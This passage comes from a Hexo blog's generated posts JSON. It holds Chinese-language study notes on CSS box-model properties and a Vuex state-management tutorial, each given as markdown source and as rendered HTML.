元素的边框就是围绕元素内容和内边据的一条或多条线。\n\n5.margin 属性接受任何长度单位，可以是像素、英寸、毫米或 em。\n\nmargin 可以设置为 auto。更常见的做法是为外边距设置长度值。\n\n6.外边距合并\n\n外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。\n\n简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。\n\n当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。\n\n**注释：**只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。","source":"_posts/Vue实战问题.md","raw":"---\ntitle: Vue笔记\ndate: 2020-11-29 21:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\nmp3: \ncover: img/vue.png\n---\n\n\nVue实战问题\n\n- [ ] 1.VScode中部分组件调用显示蓝色，部分显示红色？\n\n- [x] 2.标签组件出现Bug,无法显示标题，有待解决；\n\nCSS特性\n\n1. cursor规定要显示的光标的类型，此处pointer为一只手\n2. CSS 框模型概述\n\n\n\n![CSS 框模型](https://www.w3school.com.cn/i/ct_boxmodel.gif)\n\n3.padding 属性定义元素的内边距。padding 属性接受长度值或百分比值，但不允许使用负值\n\n```\nh1 {padding: 10px 0.25em 2ex 20%;}\n```\n\n**注意：**上下内边距与左右内边距一致；即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。\n\n4.border 元素的边框就是围绕元素内容和内边据的一条或多条线。\n\n5.margin 属性接受任何长度单位，可以是像素、英寸、毫米或 em。\n\nmargin 可以设置为 auto。更常见的做法是为外边距设置长度值。\n\n6.外边距合并\n\n外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。\n\n简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。\n\n当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。\n\n**注释：**只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。","slug":"Vue实战问题","published":1,"updated":"2020-11-29T13:19:18.000Z","_id":"clg29vyhl0046ao9c8z8363vm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Vue实战问题</p>\n<ul>\n<li><p><input disabled=\"\" type=\"checkbox\">  1.VScode中部分组件调用显示蓝色，部分显示红色？</p>\n</li>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\">  2.标签组件出现Bug,无法显示标题，有待解决；</p>\n</li>\n</ul>\n<p>CSS特性</p>\n<ol>\n<li>cursor规定要显示的光标的类型，此处pointer为一只手</li>\n<li>CSS 框模型概述</li>\n</ol>\n<p><img src=\"https://www.w3school.com.cn/i/ct_boxmodel.gif\" alt=\"CSS 框模型\"></p>\n<p>3.padding 属性定义元素的内边距。padding 属性接受长度值或百分比值，但不允许使用负值</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">h1</span> &#123;padding: <span class=\"hljs-number\">10</span>px <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>em <span class=\"hljs-number\">2</span>ex <span class=\"hljs-number\">20</span>%;&#125;<br></code></pre></td></tr></table></figure>\n\n<p><strong>注意：</strong>上下内边距与左右内边距一致；即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。</p>\n<p>4.border 元素的边框就是围绕元素内容和内边据的一条或多条线。</p>\n<p>5.margin 属性接受任何长度单位，可以是像素、英寸、毫米或 em。</p>\n<p>margin 可以设置为 auto。更常见的做法是为外边距设置长度值。</p>\n<p>6.外边距合并</p>\n<p>外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。</p>\n<p>简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</p>\n<p>当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。</p>\n<p><strong>注释：</strong>只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Vue实战问题</p>\n<ul>\n<li><p><input disabled=\"\" type=\"checkbox\">  1.VScode中部分组件调用显示蓝色，部分显示红色？</p>\n</li>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\">  2.标签组件出现Bug,无法显示标题，有待解决；</p>\n</li>\n</ul>\n<p>CSS特性</p>\n<ol>\n<li>cursor规定要显示的光标的类型，此处pointer为一只手</li>\n<li>CSS 框模型概述</li>\n</ol>\n<p><img src=\"https://www.w3school.com.cn/i/ct_boxmodel.gif\" alt=\"CSS 框模型\"></p>\n<p>3.padding 属性定义元素的内边距。padding 属性接受长度值或百分比值，但不允许使用负值</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">h1</span> &#123;padding: <span class=\"hljs-number\">10</span>px <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>em <span class=\"hljs-number\">2</span>ex <span class=\"hljs-number\">20</span>%;&#125;<br></code></pre></td></tr></table></figure>\n\n<p><strong>注意：</strong>上下内边距与左右内边距一致；即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。</p>\n<p>4.border 元素的边框就是围绕元素内容和内边据的一条或多条线。</p>\n<p>5.margin 属性接受任何长度单位，可以是像素、英寸、毫米或 em。</p>\n<p>margin 可以设置为 auto。更常见的做法是为外边距设置长度值。</p>\n<p>6.外边距合并</p>\n<p>外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。</p>\n<p>简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</p>\n<p>当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。</p>\n<p><strong>注释：</strong>只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。</p>\n"},{"title":"Vuex","date":"2023-03-27T07:18:45.000Z","mp3":null,"cover":"img/vue.png","_content":"\n\n# Vuex\n\n## 一、基础概念\n\n#### 1.Vuex是什么？\n\n状态管理模式+库；采用集中式存储管理应用组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。\n\n#### 2.状态管理模式\n\n举个栗子🌰\n\n```vue\nconst Counter = {\n  // 状态\n  data () {\n    return {\n      count: 0\n    }\n  },\n  // 视图\n  template: `\n    <div>{{ count }}</div>\n  `,\n  // 操作\n  methods: {\n    increment () {\n      this.count++\n    }\n  }\n}\n\ncreateApp(Counter).mount('#app')\n```\n\n该APP包含以下部分：\n\n- 状态，驱动应用的数据源；\n- 视图，以声明方式将状态映射到试图；\n- 操作，响应在视图上的用户输入导致状态变化；\n\n![](https://s3.bmp.ovh/imgs/2022/10/29/d3e085834c6b02a0.png)\n\n- 存在一种多个视图依赖于同一种状态的情况；\n- 不同视图变更统一状态的情况；\n\n##### 思路\n\n把组件的共享状态抽取出来，以一个全局单例模式管理；\n\n通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且更易于维护；\n\n![](https://s3.bmp.ovh/imgs/2022/10/29/348dbed9d3ef8569.png)\n\n#### 3.安装方法\n\n```html\n<script src=\"/path/to/vue.js\"></script>\n<script src=\"/path/to/vuex.js\"></script>\n```\n\n```sh\nnpm install vuex@next --save\n```\n\n#### 4. store基础\n\n如果有一部分的状态需要在多个组件实例间共享，可以使用reactive()来创建一个响应式对象，并将它导入到多个组件中。\n\n```js\n//store.js\nimport { reactive } from 'vue';\n\nexport const store=reactive({\n    count:0\n})\n```\n\n```vue\n//componentA\n<script>\n\timport { store } from './store.js'\n    \n    export default {\n        data(){\n            return{\n                store,\n            }\n        }\n    }\n</script>\n\n<template>\nFrom A:{{ store.count }}\n</template>\n```\n\n```vue\n//componentB\n<script>\n\timport { store } from './store.js'\n    \n    export default {\n        data(){\n            return{\n                store,\n            }\n        }\n    }\n</script>\n\n<template>\nFrom B:{{ store.count }}\n</template>\n```\n\n现在，所有引入了store的组件都可以改动count，但是从长远看这种代码是不容易维护的。\n\n解决方法：在store上定义方法，方法的名字需要能表达意图；\n\n```js\n//store.js\nimport { reactive } from 'vue';\n\nexport const store=reactive({\n    count:0，\n    increment(){\n    \tthis.count++\n\t},\n})\n```\n\n```vue\n<template>\n  <button @click=\"store.increment()\">\n    From B: {{ store.count }}\n  </button>\n</template>\n```\n\n#### 4.SSR（Server-Side Rendering）服务端渲染\n\n> 默认情况下，Vue 组件的职责是在浏览器中生成和操作 DOM。然而，Vue 也支持将组件在服务端直接渲染成 HTML 字符串，作为服务端响应返回给浏览器，最后在浏览器端将静态的 HTML“激活”(hydrate) 为能够交互的客户端应用。 \n\n##### 优点\n\n- 更快的首屏加载：服务端渲染的 HTML 无需等到所有的 JavaScript 都下载并执行完成之后才显示，所以你的用户将会更快地看到完整渲染的页面。数据获取过程在首次访问时在服务端完成，相比于从客户端获取，可能有更快的数据库连接。\n- 统一的心智模型\n- 更好的SEO：搜索引擎爬虫可以直接看到完全渲染的页面。\n\n## 二、使用\n\n### 1.最简单的store\n\n```js\nimport { createApp } from 'vue'\nimport { createStore } from 'vuex'\n\n// 创建一个新的 store 实例\nconst store = createStore({\n  state () {\n    return {\n      count: 0\n    }\n  },\n  mutations: {\n    increment (state) {\n      state.count++\n    }\n  }\n})\n\nconst app = createApp({ /* 根组件 */ })\n\n// 将 store 实例作为插件安装\napp.use(store)\n```\n\n\n\n\n\n","source":"_posts/Vuex.md","raw":"---\ntitle: Vuex\ndate: 2023-03-27 15:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\nmp3: \ncover: img/vue.png\n---\n\n\n# Vuex\n\n## 一、基础概念\n\n#### 1.Vuex是什么？\n\n状态管理模式+库；采用集中式存储管理应用组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。\n\n#### 2.状态管理模式\n\n举个栗子🌰\n\n```vue\nconst Counter = {\n  // 状态\n  data () {\n    return {\n      count: 0\n    }\n  },\n  // 视图\n  template: `\n    <div>{{ count }}</div>\n  `,\n  // 操作\n  methods: {\n    increment () {\n      this.count++\n    }\n  }\n}\n\ncreateApp(Counter).mount('#app')\n```\n\n该APP包含以下部分：\n\n- 状态，驱动应用的数据源；\n- 视图，以声明方式将状态映射到试图；\n- 操作，响应在视图上的用户输入导致状态变化；\n\n![](https://s3.bmp.ovh/imgs/2022/10/29/d3e085834c6b02a0.png)\n\n- 存在一种多个视图依赖于同一种状态的情况；\n- 不同视图变更统一状态的情况；\n\n##### 思路\n\n把组件的共享状态抽取出来，以一个全局单例模式管理；\n\n通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且更易于维护；\n\n![](https://s3.bmp.ovh/imgs/2022/10/29/348dbed9d3ef8569.png)\n\n#### 3.安装方法\n\n```html\n<script src=\"/path/to/vue.js\"></script>\n<script src=\"/path/to/vuex.js\"></script>\n```\n\n```sh\nnpm install vuex@next --save\n```\n\n#### 4. store基础\n\n如果有一部分的状态需要在多个组件实例间共享，可以使用reactive()来创建一个响应式对象，并将它导入到多个组件中。\n\n```js\n//store.js\nimport { reactive } from 'vue';\n\nexport const store=reactive({\n    count:0\n})\n```\n\n```vue\n//componentA\n<script>\n\timport { store } from './store.js'\n    \n    export default {\n        data(){\n            return{\n                store,\n            }\n        }\n    }\n</script>\n\n<template>\nFrom A:{{ store.count }}\n</template>\n```\n\n```vue\n//componentB\n<script>\n\timport { store } from './store.js'\n    \n    export default {\n        data(){\n            return{\n                store,\n            }\n        }\n    }\n</script>\n\n<template>\nFrom B:{{ store.count }}\n</template>\n```\n\n现在，所有引入了store的组件都可以改动count，但是从长远看这种代码是不容易维护的。\n\n解决方法：在store上定义方法，方法的名字需要能表达意图；\n\n```js\n//store.js\nimport { reactive } from 'vue';\n\nexport const store=reactive({\n    count:0，\n    increment(){\n    \tthis.count++\n\t},\n})\n```\n\n```vue\n<template>\n  <button @click=\"store.increment()\">\n    From B: {{ store.count }}\n  </button>\n</template>\n```\n\n#### 4.SSR（Server-Side Rendering）服务端渲染\n\n> 默认情况下，Vue 组件的职责是在浏览器中生成和操作 DOM。然而，Vue 也支持将组件在服务端直接渲染成 HTML 字符串，作为服务端响应返回给浏览器，最后在浏览器端将静态的 HTML“激活”(hydrate) 为能够交互的客户端应用。 \n\n##### 优点\n\n- 更快的首屏加载：服务端渲染的 HTML 无需等到所有的 JavaScript 都下载并执行完成之后才显示，所以你的用户将会更快地看到完整渲染的页面。数据获取过程在首次访问时在服务端完成，相比于从客户端获取，可能有更快的数据库连接。\n- 统一的心智模型\n- 更好的SEO：搜索引擎爬虫可以直接看到完全渲染的页面。\n\n## 二、使用\n\n### 1.最简单的store\n\n```js\nimport { createApp } from 'vue'\nimport { createStore } from 'vuex'\n\n// 创建一个新的 store 实例\nconst store = createStore({\n  state () {\n    return {\n      count: 0\n    }\n  },\n  mutations: {\n    increment (state) {\n      state.count++\n    }\n  }\n})\n\nconst app = createApp({ /* 根组件 */ })\n\n// 将 store 实例作为插件安装\napp.use(store)\n```\n\n\n\n\n\n","slug":"Vuex","published":1,"updated":"2023-03-27T11:21:04.292Z","_id":"clg29vyhn0049ao9cbvf2hidn","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Vuex\"><a href=\"#Vuex\" class=\"headerlink\" title=\"Vuex\"></a>Vuex</h1><h2 id=\"一、基础概念\"><a href=\"#一、基础概念\" class=\"headerlink\" title=\"一、基础概念\"></a>一、基础概念</h2><h4 id=\"1-Vuex是什么？\"><a href=\"#1-Vuex是什么？\" class=\"headerlink\" title=\"1.Vuex是什么？\"></a>1.Vuex是什么？</h4><p>状态管理模式+库；采用集中式存储管理应用组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p>\n<h4 id=\"2-状态管理模式\"><a href=\"#2-状态管理模式\" class=\"headerlink\" title=\"2.状态管理模式\"></a>2.状态管理模式</h4><p>举个栗子🌰</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">const Counter = &#123;<br>  // 状态<br>  data () &#123;<br>    return &#123;<br>      count: 0<br>    &#125;<br>  &#125;,<br>  // 视图<br>  template: `<br>    &lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;<br>  `,<br>  // 操作<br>  methods: &#123;<br>    increment () &#123;<br>      this.count++<br>    &#125;<br>  &#125;<br>&#125;<br><br>createApp(Counter).mount(&#x27;#app&#x27;)<br></code></pre></td></tr></table></figure>\n\n<p>该APP包含以下部分：</p>\n<ul>\n<li>状态，驱动应用的数据源；</li>\n<li>视图，以声明方式将状态映射到试图；</li>\n<li>操作，响应在视图上的用户输入导致状态变化；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/29/d3e085834c6b02a0.png\"></p>\n<ul>\n<li>存在一种多个视图依赖于同一种状态的情况；</li>\n<li>不同视图变更统一状态的情况；</li>\n</ul>\n<h5 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h5><p>把组件的共享状态抽取出来，以一个全局单例模式管理；</p>\n<p>通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且更易于维护；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/29/348dbed9d3ef8569.png\"></p>\n<h4 id=\"3-安装方法\"><a href=\"#3-安装方法\" class=\"headerlink\" title=\"3.安装方法\"></a>3.安装方法</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;/path/to/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;/path/to/vuex.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">npm install vuex@next --save<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-store基础\"><a href=\"#4-store基础\" class=\"headerlink\" title=\"4. store基础\"></a>4. store基础</h4><p>如果有一部分的状态需要在多个组件实例间共享，可以使用reactive()来创建一个响应式对象，并将它导入到多个组件中。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//store.js</span><br><span class=\"hljs-keyword\">import</span> &#123; reactive &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span>;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> store=<span class=\"hljs-title function_\">reactive</span>(&#123;<br>    <span class=\"hljs-attr\">count</span>:<span class=\"hljs-number\">0</span><br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">//componentA<br>&lt;script&gt;<br>\timport &#123; store &#125; from &#x27;./store.js&#x27;<br>    <br>    export default &#123;<br>        data()&#123;<br>            return&#123;<br>                store,<br>            &#125;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;template&gt;<br>From A:&#123;&#123; store.count &#125;&#125;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">//componentB<br>&lt;script&gt;<br>\timport &#123; store &#125; from &#x27;./store.js&#x27;<br>    <br>    export default &#123;<br>        data()&#123;<br>            return&#123;<br>                store,<br>            &#125;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;template&gt;<br>From B:&#123;&#123; store.count &#125;&#125;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure>\n\n<p>现在，所有引入了store的组件都可以改动count，但是从长远看这种代码是不容易维护的。</p>\n<p>解决方法：在store上定义方法，方法的名字需要能表达意图；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//store.js</span><br><span class=\"hljs-keyword\">import</span> &#123; reactive &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span>;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> store=<span class=\"hljs-title function_\">reactive</span>(&#123;<br>    <span class=\"hljs-attr\">count</span>:<span class=\"hljs-number\">0</span>，<br>    <span class=\"hljs-title function_\">increment</span>(<span class=\"hljs-params\"></span>)&#123;<br>    \t<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">count</span>++<br>\t&#125;,<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&lt;template&gt;<br>  &lt;button @click=&quot;store.increment()&quot;&gt;<br>    From B: &#123;&#123; store.count &#125;&#125;<br>  &lt;/button&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-SSR（Server-Side-Rendering）服务端渲染\"><a href=\"#4-SSR（Server-Side-Rendering）服务端渲染\" class=\"headerlink\" title=\"4.SSR（Server-Side Rendering）服务端渲染\"></a>4.SSR（Server-Side Rendering）服务端渲染</h4><blockquote>\n<p>默认情况下，Vue 组件的职责是在浏览器中生成和操作 DOM。然而，Vue 也支持将组件在服务端直接渲染成 HTML 字符串，作为服务端响应返回给浏览器，最后在浏览器端将静态的 HTML“激活”(hydrate) 为能够交互的客户端应用。 </p>\n</blockquote>\n<h5 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h5><ul>\n<li>更快的首屏加载：服务端渲染的 HTML 无需等到所有的 JavaScript 都下载并执行完成之后才显示，所以你的用户将会更快地看到完整渲染的页面。数据获取过程在首次访问时在服务端完成，相比于从客户端获取，可能有更快的数据库连接。</li>\n<li>统一的心智模型</li>\n<li>更好的SEO：搜索引擎爬虫可以直接看到完全渲染的页面。</li>\n</ul>\n<h2 id=\"二、使用\"><a href=\"#二、使用\" class=\"headerlink\" title=\"二、使用\"></a>二、使用</h2><h3 id=\"1-最简单的store\"><a href=\"#1-最简单的store\" class=\"headerlink\" title=\"1.最简单的store\"></a>1.最简单的store</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; createApp &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span><br><span class=\"hljs-keyword\">import</span> &#123; createStore &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vuex&#x27;</span><br><br><span class=\"hljs-comment\">// 创建一个新的 store 实例</span><br><span class=\"hljs-keyword\">const</span> store = <span class=\"hljs-title function_\">createStore</span>(&#123;<br>  state () &#123;<br>    <span class=\"hljs-keyword\">return</span> &#123;<br>      <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span><br>    &#125;<br>  &#125;,<br>  <span class=\"hljs-attr\">mutations</span>: &#123;<br>    increment (state) &#123;<br>      state.<span class=\"hljs-property\">count</span>++<br>    &#125;<br>  &#125;<br>&#125;)<br><br><span class=\"hljs-keyword\">const</span> app = <span class=\"hljs-title function_\">createApp</span>(&#123; <span class=\"hljs-comment\">/* 根组件 */</span> &#125;)<br><br><span class=\"hljs-comment\">// 将 store 实例作为插件安装</span><br>app.<span class=\"hljs-title function_\">use</span>(store)<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Vuex\"><a href=\"#Vuex\" class=\"headerlink\" title=\"Vuex\"></a>Vuex</h1><h2 id=\"一、基础概念\"><a href=\"#一、基础概念\" class=\"headerlink\" title=\"一、基础概念\"></a>一、基础概念</h2><h4 id=\"1-Vuex是什么？\"><a href=\"#1-Vuex是什么？\" class=\"headerlink\" title=\"1.Vuex是什么？\"></a>1.Vuex是什么？</h4><p>状态管理模式+库；采用集中式存储管理应用组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p>\n<h4 id=\"2-状态管理模式\"><a href=\"#2-状态管理模式\" class=\"headerlink\" title=\"2.状态管理模式\"></a>2.状态管理模式</h4><p>举个栗子🌰</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">const Counter = &#123;<br>  // 状态<br>  data () &#123;<br>    return &#123;<br>      count: 0<br>    &#125;<br>  &#125;,<br>  // 视图<br>  template: `<br>    &lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;<br>  `,<br>  // 操作<br>  methods: &#123;<br>    increment () &#123;<br>      this.count++<br>    &#125;<br>  &#125;<br>&#125;<br><br>createApp(Counter).mount(&#x27;#app&#x27;)<br></code></pre></td></tr></table></figure>\n\n<p>该APP包含以下部分：</p>\n<ul>\n<li>状态，驱动应用的数据源；</li>\n<li>视图，以声明方式将状态映射到试图；</li>\n<li>操作，响应在视图上的用户输入导致状态变化；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/29/d3e085834c6b02a0.png\"></p>\n<ul>\n<li>存在一种多个视图依赖于同一种状态的情况；</li>\n<li>不同视图变更统一状态的情况；</li>\n</ul>\n<h5 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h5><p>把组件的共享状态抽取出来，以一个全局单例模式管理；</p>\n<p>通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且更易于维护；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/29/348dbed9d3ef8569.png\"></p>\n<h4 id=\"3-安装方法\"><a href=\"#3-安装方法\" class=\"headerlink\" title=\"3.安装方法\"></a>3.安装方法</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;/path/to/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;/path/to/vuex.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">npm install vuex@next --save<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-store基础\"><a href=\"#4-store基础\" class=\"headerlink\" title=\"4. store基础\"></a>4. store基础</h4><p>如果有一部分的状态需要在多个组件实例间共享，可以使用reactive()来创建一个响应式对象，并将它导入到多个组件中。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//store.js</span><br><span 